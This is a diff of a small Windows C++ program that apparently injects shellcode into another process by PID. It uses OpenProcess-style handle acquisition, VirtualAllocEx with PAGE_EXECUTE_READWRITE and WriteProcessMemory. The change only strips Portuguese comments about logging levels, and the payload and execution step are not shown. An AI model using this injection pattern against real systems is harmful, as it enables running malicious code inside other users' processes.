@@ -21,7 +21,7 @@ int main(int argc, char* argv[]) {
         //
         if (argc < 2) {
             //
-            LOG_FAILURE("Usage: Program.exe <PID>");  // Mudado para LOG_FAILURE, pois é um erro de falta de argumento.
+            LOG_FAILURE("Usage: Program.exe <PID>");
 
             return 1;
         }
@@ -34,9 +34,8 @@ int main(int argc, char* argv[]) {
 
         if (hProcess == NULL) {
             //
-            LOG_FAILURE("Couldn't get a handle to the process " << "(" << PID << ")" << " !");  // Mudado para LOG_FAILURE, pois não conseguimos acessar o processo.
-            LOG_CRITICAL("Error: " << GetLastError());  // Não mudou, pois esse é um erro crítico que precisamos registrar.
-
+            LOG_FAILURE("Couldn't get a handle to the process " << "(" << PID << ")" << " !");
+            LOG_CRITICAL("Error: " << GetLastError());
             return 1;
         }
 
@@ -45,7 +44,6 @@ int main(int argc, char* argv[]) {
         rBuffer = VirtualAllocEx(hProcess, NULL, shellSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
         if (rBuffer == NULL) {
-            // Caso o buffer não seja alocado com sucesso, é um erro.
             LOG_FAILURE("Failed to allocate memory in the target process.");
             LOG_CRITICAL("Error: " << GetLastError());
 
@@ -56,7 +54,6 @@ int main(int argc, char* argv[]) {
         LOG_INFO("Allocated " << shellSize << " bytes with PAGE_EXECUTE_READWRITE permissions !");
 
         if (!WriteProcessMemory(hProcess, rBuffer, Shell, shellSize, NULL)) {
-            // Caso o WriteProcessMemory falhe.
             LOG_FAILURE("Failed to write memory to the process.");
             LOG_CRITICAL("Error: " << GetLastError());
 
